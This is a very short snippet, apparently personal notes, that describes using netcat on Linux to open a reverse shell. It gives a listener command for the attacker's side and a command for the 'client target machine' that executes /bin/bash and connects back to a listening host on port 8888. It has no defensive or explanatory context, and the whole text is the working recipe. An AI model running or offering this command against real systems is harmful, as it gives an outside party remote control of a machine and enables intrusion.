"""
in linux it is fairly easy with the use of netcat command
"""

#server listener

nc -nlvp 8888

#client target machine
#apt install ncat
nc -e /bin/bash 128.0.0.1  8888